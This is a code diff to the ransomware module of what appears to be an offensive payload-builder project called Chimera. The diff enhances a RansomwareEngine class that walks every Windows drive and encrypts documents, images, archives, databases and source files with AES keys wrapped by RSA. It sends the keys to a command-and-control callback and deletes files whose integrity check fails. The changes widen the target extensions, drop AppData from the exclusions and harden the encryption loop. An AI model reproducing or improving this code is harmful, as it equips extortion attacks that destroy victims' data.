@@ -1,3 +1,4 @@
+#~/Desktop/Chimera/PayloadBuilder/modules/ransomware.py
 """
 Ransomware Engine Module - Chimera
 ===================================
@@ -39,10 +40,12 @@ class RansomwareEngine:
         self.hmac_keys = {}          # mapping: encrypted_filepath -> HMAC key (bytes)
         self.target_extensions = [
             '.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.jpeg', '.png',
+            '.gif', '.bmp', '.tiff', '.psd', '.ai', '.svg',  # more images
             '.zip', '.rar', '.7z', '.mp3', '.mp4', '.avi', '.mov',
             '.ppt', '.pptx', '.odt', '.ods', '.odp', '.csv',
             '.doc', '.xls', '.ppt', '.xml', '.json', '.log',
-            '.db', '.sqlite', '.bak', '.backup', '.php', '.html'
+            '.db', '.sqlite', '.bak', '.backup', '.php', '.html',
+            '.py', '.js', '.css', '.c', '.cpp', '.java', '.go', # code files
         ]
         self.send_to_c2 = send_key_callback or (lambda data: None)
 
@@ -73,6 +76,7 @@ class RansomwareEngine:
                 "rsa_public": base64.b64encode(self.public_key).decode('utf-8')
             }
         except Exception as e:
+            print(f"[RANSOM] Key generation error: {e}")
             return None
 
     def _send_private_key(self):
@@ -100,15 +104,18 @@ class RansomwareEngine:
         self.send_to_c2(data)
 
     def encrypt_specific_file(self, filepath):
-        """
-        Encrypt a single file using multi-layer encryption.
-        Final file structure: IV (16) | encrypted AES key length (2) | encrypted AES key | ciphertext | HMAC (32)
-        """
+        """Encrypt a single file with AES-256-CBC, RSA-encrypted key, and HMAC."""
         try:
             if not os.path.exists(filepath):
                 return {"status": "error", "message": "File not found"}
             if os.path.isdir(filepath):
                 return {"status": "error", "message": "Path is a directory"}
+
+            # Check permissions
+            if not os.access(filepath, os.R_OK):
+                return {"status": "error", "message": "No read permission"}
+            if not os.access(os.path.dirname(filepath), os.W_OK):
+                return {"status": "error", "message": "No write permission in directory"}
 
             # Per-file AES key
             file_aes_key = get_random_bytes(32)
@@ -145,6 +152,8 @@ class RansomwareEngine:
             self._send_hmac_key(encrypted_path, hmac_key)
 
             return {"status": "success", "file": filepath, "encrypted": encrypted_path}
+        except PermissionError as e:
+            return {"status": "error", "message": f"Permission denied: {e}"}
         except Exception as e:
             return {"status": "error", "message": str(e)}
 
@@ -165,36 +174,44 @@ class RansomwareEngine:
         return {"status": "success", "files_encrypted": len(self.encrypted_files), "details": results}
 
     def encrypt_full_system(self):
-        """Encrypt all drives except system folders."""
+        """Encrypt all drives except system folders, with verbose logging."""
         drives = []
         for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
             drive = f"{letter}:\\"
             if os.path.exists(drive):
                 drives.append(drive)
 
+        # Only skip critical system folders – user data is safe
         exclude_dirs = ['Windows', 'Program Files', 'Program Files (x86)',
-                        'System32', 'System', 'Temp', 'AppData', 'boot']
+                        'System32', 'System', 'Temp', 'boot']
 
         results = []
+        total_encrypted = 0
         for drive in drives:
-            for root, dirs, files in os.walk(drive):
-                if any(ex.lower() in root.lower() for ex in exclude_dirs):
-                    continue
+            print(f"[RANSOM] Scanning drive: {drive}")
+            for root, dirs, files in os.walk(drive, topdown=True):
+                # Skip excluded directories
+                dirs[:] = [d for d in dirs if d not in exclude_dirs]
                 for file in files:
                     ext = os.path.splitext(file)[1].lower()
-                    if ext in self.target_extensions:
-                        full_path = os.path.join(root, file)
-                        if not full_path.endswith('.encrypted'):
-                            result = self.encrypt_specific_file(full_path)
-                            results.append(result)
-                            time.sleep(0.05)
-        return {"status": "success", "files_encrypted": len(self.encrypted_files), "details": results}
+                    if ext not in self.target_extensions:
+                        continue
+                    full_path = os.path.join(root, file)
+                    if full_path.endswith('.encrypted'):
+                        continue
+                    print(f"[RANSOM] Encrypting: {full_path}")
+                    result = self.encrypt_specific_file(full_path)
+                    results.append(result)
+                    if result.get('status') == 'success':
+                        total_encrypted += 1
+                    else:
+                        print(f"[RANSOM] FAILED: {full_path} – {result.get('message')}")
+                    time.sleep(0.05)  # small delay
+        return {"status": "success", "files_encrypted": total_encrypted, "details": results}
 
     @staticmethod
     def safe_decrypt_file(encrypted_path, private_key_pem, hmac_key):
-        """
-        Decrypt a file; if HMAC verification fails, the file is deleted automatically.
-        """
+        """Decrypt a file; if HMAC fails, the file is deleted."""
         try:
             with open(encrypted_path, 'rb') as f:
                 data = f.read()
@@ -212,6 +229,7 @@ class RansomwareEngine:
             try:
                 h.verify(signature)
             except ValueError:
+                print(f"[DECRYPT] HMAC verification failed for {encrypted_path} – file will be deleted")
                 if os.path.exists(encrypted_path):
                     os.remove(encrypted_path)
                 raise Exception("Integrity check failed – file deleted.")
@@ -227,8 +245,8 @@ class RansomwareEngine:
                 f.write(plaintext)
 
             os.remove(encrypted_path)
+            print(f"[DECRYPT] Success: {original_path}")
             return True
         except Exception as e:
-            if os.path.exists(encrypted_path):
-                os.remove(encrypted_path)
+            print(f"[DECRYPT] Error decrypting {encrypted_path}: {e}")
             raise e
